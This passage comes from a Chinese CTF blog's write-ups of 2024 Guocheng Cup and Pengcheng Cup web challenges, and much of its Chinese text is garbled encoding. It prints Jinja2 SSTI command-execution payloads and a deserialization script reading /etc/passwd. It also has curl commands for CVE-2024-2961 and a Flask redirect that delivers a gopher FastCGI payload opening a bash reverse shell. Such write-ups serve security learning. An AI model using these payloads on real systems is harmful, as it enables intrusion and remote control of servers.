class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>)[<span class="hljs-string">&#x27;modules&#x27;</span>][<span class="hljs-string">&#x27;wsgiref&#x27;</span>][<span class="hljs-string">&#x27;simple_server&#x27;</span>][<span class="hljs-string">&#x27;ServerHandler&#x27;</span>],<span class="hljs-string">&#x27;http_version&#x27;</span>,cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234341609.png" alt="image-20241209234341609"></p><p>è€Œä¸”èµ›åç¾¤é‡Œè¿˜æœ‰å¸ˆå‚…ç»™å‡ºä¸€ç§æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;setattr&#x27;</span>]((((lipsum|attr(<span class="hljs-string">&#x27;__spec__&#x27;</span>))|attr(<span class="hljs-string">&#x27;__init__&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>))[<span class="hljs-string">&#x27;sys&#x27;</span>]|attr(<span class="hljs-string">&#x27;modules&#x27;</span>))[<span class="hljs-string">&#x27;wsgiref&#x27;</span>]|attr(<span class="hljs-string">&#x27;simple_server&#x27;</span>)|attr(<span class="hljs-string">&#x27;ServerHandler&#x27;</span>),<span class="hljs-string">&#x27;server_so&#x27;</span>+<span class="hljs-string">&#x27;ftware&#x27;</span>,lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;/readflag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())&#125;&#125;<br></code></pre></td></tr></table></figure><p>åªæ˜¯è¿™ç§æ–¹æ³•ä¹Ÿéœ€è¦æ‰“ç›²æ³¨ï¼Œåç»­ä¸å¤šè¯´äº†ã€‚è¿™é‡Œçš„<code>lipsum</code>å¯ä»¥å…³æ³¨ä¸€ä¸‹ï¼Œç”¨æ³•å¾ˆå¤šï¼Œä¹Ÿé€‚ç”¨äºå¾ˆå¤šå¥‡æŠ€æ·«å·§ã€‚</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>ä»302è·³è½¬åˆ°Fastcgiçš„SSRFã€‚</p><p>ä½†æ˜¯å¹³å°é¶æœºä¸Šä¸äº†å¤–ç½‘ï¼Œå¤ªå‚»é€¼äº†ã€‚</p><p>dirsearchèƒ½æ‰«åˆ°index.php.swpæ–‡ä»¶ï¼Œvim -rè¯»ä¸€ä¸‹è·å¾—guestç™»å½•è´¦å·å¯†ç ã€‚</p><p>ç„¶åç™»å½•è¿›å»èƒ½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶è¯»å–è·¯ç”±ï¼Œç›´æ¥è¯»åªæœ‰ä¸ªå‡flagã€‚çŒœæµ‹è¯»çœŸflagè¿˜å¾—æ‹¿shellææƒã€‚</p><p>è¯»æ–‡ä»¶è¿™é‡Œç”¨åˆ°çš„æ˜¯äºŒæ¬¡URLç¼–ç ï¼ŒäºŒæ¬¡URLç¼–ç èƒ½å¤Ÿåˆ©ç”¨filterè¯»å–åˆ°admin.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=admin.php</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®filter-chainéé¢„æœŸç›´æ¥å¯ä»¥æ‰“äº†ï¼Œå¯ä»¥çœ‹çœ‹ç½‘ä¸Šå…¶ä»–äººçš„wpã€‚</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241212193455018.png" alt="image-20241212193455018"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] !== <span class="hljs-literal">true</span> || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-string">&#x27;Please fill in the username and password&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$page_content</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https:\/\//&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;Invalid URL, only https allowed&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-number">1</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <br>        <span class="hljs-variable">$page_content</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page_content</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$error_message</span> = <span class="hljs-string">&#x27;Failed to fetch the URL content&#x27;</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&#x27;en&#x27;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&#x27;UTF-8&#x27;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&#x27;viewport&#x27;</span> content=<span class="hljs-string">&#x27;width=device-width, initial-scale=1.0&#x27;</span>&gt;<br>    &lt;title&gt;Welcome&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            margin: <span class="hljs-number">0</span>;<br>            display: flex;<br>            justify-content: center;<br>            align-items: center;<br>            height: <span class="hljs-number">100</span>vh;<br>            background: linear-<span class="hljs-title function_ invoke__">gradient</span>(<span class="hljs-number">135</span>deg, #<span class="hljs-number">6</span>dd5ed, #<span class="hljs-number">2193</span>b0);<br>            font-family: Arial, sans-serif;<br>            overflow: hidden;<br>            position: relative;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">before</span>, body::<span class="hljs-variable constant_">after</span> &#123;<br>            content: <span class="hljs-string">&#x27;&#x27;</span>;<br>            position: absolute;<br>            width: <span class="hljs-number">400</span>px;<br>            height: <span class="hljs-number">400</span>px;<br>            border-radius: <span class="hljs-number">50</span>%;<br>            background: <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);<br>            animation: <span class="hljs-keyword">float</span> <span class="hljs-number">6</span>s ease-in-out infinite;<br>            z-index: <span class="hljs-number">0</span>;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">before</span> &#123;<br>            top: -<span class="hljs-number">100</span>px;<br>            right: -<span class="hljs-number">150</span>px;<br>        &#125;<br><br>        body::<span class="hljs-variable constant_">after</span> &#123;<br>            bottom: -<span class="hljs-number">150</span>px;<br>            left: -<span class="hljs-number">100</span>px;<br>        &#125;<br><br>        @keyframes <span class="hljs-keyword">float</span> &#123;<br>            <span class="hljs-number">0</span>%, <span class="hljs-number">100</span>% &#123; transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">0</span>); &#125;<br>            <span class="hljs-number">50</span>% &#123; transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">20</span>px); &#125;<br>        &#125;<br><br>        .login-container &#123;<br>            position: relative;<br>            z-index: <span class="hljs-number">1</span>;<br>            width: <span class="hljs-number">350</span>px;<br>            padding: <span class="hljs-number">2</span>rem;<br>            background-color: <span class="hljs-comment">#ffffff;</span><br>            border-radius: <span class="hljs-number">12</span>px;<br>            text-align: center;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">4</span>px <span class="hljs-number">20</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>            backdrop-filter: <span class="hljs-title function_ invoke__">blur</span>(<span class="hljs-number">10</span>px);<br>            transition: transform <span class="hljs-number">0.3</span>s ease;<br>        &#125;<br><br>        .login-container:hover &#123;<br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(-<span class="hljs-number">5</span>px);<br>        &#125;<br><br>        .login-container h2 &#123;<br>            margin-bottom: <span class="hljs-number">1.5</span>rem;<br>            color: <span class="hljs-comment">#333;</span><br>            font-weight: bold;<br>        &#125;<br><br>        .login-container input[type=<span class="hljs-string">&#x27;text&#x27;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">0.75</span>rem;<br>            margin: <span class="hljs-number">0.5</span>rem <span class="hljs-number">0</span>;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            box-sizing: border-box;<br>            font-size: <span class="hljs-number">1</span>rem;<br>            outline: none;<br>            transition: border-color <span class="hljs-number">0.3</span>s ease;<br>        &#125;<br><br>        .login-container input[type=<span class="hljs-string">&#x27;text&#x27;</span>]:focus &#123;<br>            border-color: <span class="hljs-comment">#4CAF50;</span><br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">76</span>, <span class="hljs-number">175</span>, <span class="hljs-number">80</span>, <span class="hljs-number">0.5</span>);<br>        &#125;<br><br>        .login-container button &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">0.75</span>rem;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            font-size: <span class="hljs-number">1</span>rem;<br>            cursor: pointer;<br>            transition: background-color <span class="hljs-number">0.3</span>s, transform <span class="hljs-number">0.3</span>s;<br>            position: relative;<br>            overflow: hidden;<br>        &#125;<br><br>        .login-container button:hover &#123;<br>            background-color: <span class="hljs-comment">#45a049;</span><br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(-<span class="hljs-number">3</span>px);<br>        &#125;<br><br>        .login-container button:active &#123;<br>            transform: <span class="hljs-title function_ invoke__">translateY</span>(<span class="hljs-number">1</span>px);<br>        &#125;<br><br>        .login-container p &#123;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            color: <span class="hljs-comment">#666;</span><br>            font-size: <span class="hljs-number">0.9</span>rem;<br>        &#125;<br><br>        .error &#123;<br>            color: red;<br>            margin-top: <span class="hljs-number">0.5</span>rem;<br>            text-align: center;<br>            font-size: <span class="hljs-number">0.9</span>rem;<br>        &#125;<br><br>        .content &#123;<br>            margin-top: <span class="hljs-number">1</span>rem;<br>            padding: <span class="hljs-number">1</span>rem;<br>            background-color: <span class="hljs-comment">#f9f9f9;</span><br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#ddd;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            max-height: <span class="hljs-number">200</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&#x27;<span class="hljs-title">login</span>-<span class="hljs-title">container</span>&#x27;&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Welcome</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">p</span>&gt;Ã§Â½Â‘Ã©Â¡ÂµÃ¦ÂŸÂ¥Ã§ÂœÂ‹Ã¯Â¼ÂŒ<span class="hljs-title">just</span> <span class="hljs-title">do</span> <span class="hljs-title">it</span>Ã°ÂŸÂ˜Â&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">form</span> <span class="hljs-title">method</span>=&#x27;<span class="hljs-title">post</span>&#x27; <span class="hljs-title">action</span>=&#x27;&#x27;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&#x27;<span class="hljs-title">text</span>&#x27; <span class="hljs-title">name</span>=&#x27;<span class="hljs-title">url</span>&#x27; <span class="hljs-title">placeholder</span>=&#x27;<span class="hljs-title">Enter</span> <span class="hljs-title">URL</span>&#x27; <span class="hljs-title">required</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&#x27;<span class="hljs-title">submit</span>&#x27;&gt;<span class="hljs-title">Submit</span>&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">error_message</span>)) : ?&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&#x27;<span class="hljs-title">error</span>&#x27;&gt;&lt;?= <span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">error_message</span>) ?&gt;&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">if</span> (!<span class="hljs-title">empty</span>($<span class="hljs-title">page_content</span>)) : ?&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&#x27;<span class="hljs-title">content</span>&#x27;&gt;</span><br><span class="hljs-class">            &lt;?= <span class="hljs-title">nl2br</span>(<span class="hljs-title">htmlspecialchars</span>($<span class="hljs-title">page_content</span>)); ?&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">    &lt;?<span class="hljs-title">php</span> <span class="hljs-title">endif</span>; ?&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å‘ç°èƒ½æ‰“302çš„SSRFï¼Œç„¶è€Œä¸çŸ¥é“å¯†ç è´¦å·ï¼Œç™»å½•é¡µé¢æœ‰ä¸ªStoredAccounts.phpï¼Œè¯»ä¸€ä¸‹æ‹¿åˆ°adminçš„è´¦å¯†äº†ï¼Œç™»å…¥ã€‚</p><p>ä½†æ˜¯æˆ‘è‡ªå·±çš„åŸŸåèµ·flaskè·³è½¬æ‰“fastcgiæ‰“ä¸è¿›å»ï¼Œé¶æœºä¸å‡ºç½‘ï¼Œä¹Ÿä¸çŸ¥é“å‡ºé¢˜äººå’‹æƒ³çš„ï¼Œå°±è®©äººç”¨filter-chainéé¢„æœŸå‘—ã€‚ã€‚ã€‚</p><p>å®˜æ–¹ç»™çš„ç”¨gopherusé€ ä¸ªpayloadæ‰“fastcgi-SSRFåå¼¹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, redirect<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">indexRedirect</span>():<br>redirectUrl = <span class="hljs-string">&#x27;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/admin.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/vps/port%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#x27;</span><br><span class="hljs-keyword">return</span> redirect(redirectUrl)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>è¯¦æƒ…å’Œå…¶ä»–é¢˜å¤šè§£å¯çœ‹ï¼š</p><p><a href="https://z3r4y.blog.csdn.net/article/details/144333686?spm=1001.2014.3001.5502">ã€Webã€‘2024â€œå›½åŸæ¯â€ç½‘ç»œå®‰å…¨æŒ‘æˆ˜å¤§èµ›é¢˜è§£-CSDNåšå®¢</a></p><p>å‰©ä¸‹é‚£é“ååºåˆ—åŒ–æ‰“sessionå’Œpharï¼Œä¸æ‰“ç®—åšäº†ï¼Œä¹Ÿæ²¡å¿ƒæƒ…å¤ç°ã€‚</p><p>å‡†å¤‡æœŸæœ«äº†ã€‚ä¸‹æ’­ä¸€é˜µå­ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024é¹åŸæ¯-web</title>
    <link href="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/"/>
    <url>/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¤å¥äº†ã€‚webåŒ…akçš„ã€‚</p><p>è¯„ä»·ä¸ºå¼±æ™ºé¢˜ã€‚</p><h2 id="fileread"><a href="#fileread" class="headerlink" title="fileread"></a>fileread</h2><p>ååºåˆ—åŒ–ä»»æ„æ–‡ä»¶è¯»ï¼Œèƒ½æ‰¾åˆ°æ ¹ç›®å½•æœ‰readflagä½†æ˜¯æ— å›æ˜¾ï¼Œéœ€è¦RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls1</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$cls</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cls2</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;hello.php&#x27;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$txt</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls1</span>();<br><span class="hljs-variable">$a</span>-&gt;cls=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cls2</span>();<br><span class="hljs-comment">// // $a-&gt;cls-&gt;filename=&#x27;/proc/1/cmdline&#x27;;</span><br><span class="hljs-comment">// $a-&gt;cls-&gt;filename=&#x27;/tmp/run.sh&#x27;;</span><br><span class="hljs-variable">$a</span>-&gt;cls-&gt;filename=<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;arr=[<span class="hljs-string">&#x27;fileput&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>ç‰ˆæœ¬ä¸ºphp8,æƒ³åˆ°æ‰“CVE-2024-2961:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://192.168.18.24/?ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjE1OiIvcHJvYy9zZWxmL21hcHMiO3M6MzoidHh0IjtzOjA6IiI7fXM6MzoiYXJyIjthOjE6e2k6MDtzOjc6ImZpbGVwdXQiO319&quot;</span> -o maps<br><br>curl <span class="hljs-string">&quot;http://192.168.18.24/?ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjg0OiJwaHA6Ly9maWx0ZXIvcmVhZD1jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9L3Vzci9saWIveDg2XzY0LWxpbnV4LWdudS9saWJjLnNvLjYiO3M6MzoidHh0IjtzOjA6IiI7fXM6MzoiYXJyIjthOjE6e2k6MDtzOjc6ImZpbGVwdXQiO319&quot;</span> -o ./1.txt<br></code></pre></td></tr></table></figure><p>ç”±äºæœ‰å‰ç¼€éœ€è¦åˆ é™¤ï¼Œæ‰€ä»¥base64è½¬ä¸€ä¸‹libc.soï¼Œç„¶åæ‰‹åŠ¨åˆ é™¤å†è½¬å›æ¥ï¼š</p><p><img src="/2024/11/13/2024%E9%B9%8F%E5%9F%8E%E6%9D%AF-web/image-20241109111401184.png" alt="image-20241109111401184"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 